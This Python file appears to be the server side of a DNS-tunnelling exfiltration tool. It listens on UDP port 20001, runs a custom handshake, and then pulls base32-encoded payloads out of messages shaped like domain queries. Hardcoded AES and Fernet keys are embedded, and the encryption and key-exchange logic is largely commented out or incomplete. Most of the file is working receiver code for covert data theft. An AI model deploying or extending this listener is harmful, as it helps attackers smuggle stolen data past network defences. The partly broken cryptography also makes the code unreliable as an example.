import socket, re, binascii
from random import randint
from cryptography.fernet import Fernet
from base64 import b32encode, b32decode
from dnslib import DNSRecord
from Crypto.Cipher import AES
from io import StringIO

from utils import *

sock = socket.socket(family=socket.AF_INET, type=socket.SOCK_DGRAM)
sock.bind(('0.0.0.0', 20001))

print("The cat says -> UDP server up and listening")

hardcoded_key = Fernet(b'FoC5hr0Nc3e7sCkl4ptaKRvFh3MBQk9EZpy5KwWhZ30=')
g,n,a = GenerateGenerator(), GeneratePrime(),randint(10000, 100000)
ga = (g ** a) % n

class FKDL():
    def pad_enc(text):
        val=int(hex(text[-1]),16)
        for i in range(len(text)-1,len(text)-val-1,-1):
            if text[i]!=val:return
        return text[:(len(text)-val)]
    
    def pad_dec(text):
        output,val=StringIO(),48-(len(text)%48)
        for _ in range(val):output.write('%02x'%val)
        return text+binascii.unhexlify(output.getvalue())

    def encrypt(data):
        aes = AES.new(b"\x80I\xc3\xc9\xc2\xb3\'Y\xbb\x84\xb4\xb7\xa4r13\x11TY\x85)\xc1\xf7\xedG\xbck\x08\x06[7\x11", AES.MODE_OCB, b"\xad\x83\xeb\xbc\x08'\xa5\x15\x94\\\x0c3\x84\xa5`")
        aes.block_size = 512

        return b32encode(data.encode())
        #return b32encode(
        #    aes.encrypt(
        #        FKDL.encode(
        #            data
        #        )
        #    )
        #)[::-1].decode().replace('=','-')

    def decrypt(data):
        aes_decrypter = AES.new(b"\x80I\xc3\xc9\xc2\xb3\'Y\xbb\x84\xb4\xb7\xa4r13\x11TY\x85)\xc1\xf7\xedG\xbck\x08\x06[7\x11", AES.MODE_OCB, b"\xad\x83\xeb\xbc\x08'\xa5\x15\x94\\\x0c3\x84\xa5`")
        aes_decrypter.block_size = 512

        return b32decode(data.encode())
        #return FKDL.decode(
        #    aes_decrypter.decrypt(
        #        b32decode(
        #            str(data).replace('-','=')[::-1].encode()
        #        )
        #    )
        #).decode()

rawdata = []
while 1:
    msg, addy = sock.recvfrom(1024)

    #print(f'The cat says -> Received "{str(msg)}" from "{addy}"')
    sock.sendto(b'SERVER_HELO', addy)

    msg, addy = sock.recvfrom(1024)
    if msg == b'READY':
        #sock.sendto(hardcoded_key.encrypt(f'{str(n)}:{str(g)}'.encode()), addy)

        msg, addy = sock.recvfrom(1024)
        if msg == b'OK':
            #sock.sendto(str(ga).encode(), addy)
            #gb = int(sock.recvfrom(1024)[0].decode())
            #key = (gb ** a) % n

            #keyraw = '{:032b}'.format(key)
            #fernet = Fernet(urlsafe_b32encode(bytes(keyraw,encoding='utf8')))

            msg, addy = sock.recvfrom(1024)
            if msg == b'SOF':
                while 1:
                    dnsdata, addr = sock.recvfrom(1024)
                    print(dnsdata)
                    if dnsdata == b'EOF': break

                    msgrecv = dnsdata.decode()
                    print(msgrecv)
                    encrypted = msgrecv.split('{q')[1].split('mydomain')[0]
                    print(encrypted)
                    print(FKDL.decrypt(encrypted))
                    #print(msg.replace('mydomaintld','').replace('{q',''))
                    
                #print(rawdata)

                #msg = DNSRecord.parse( binascii.unhexlify(binascii.b2a_hex(dnsdata)) )
                #m = re.search(r'\;(\S+)\.mydomain\.tld', str(msg), re.MULTILINE)
                #if m:
                #    received_data = m.group(1)
                #    print('Received data: ', received_data)
                #    print('Cleartext: ', FKDL.decrypt(received_data))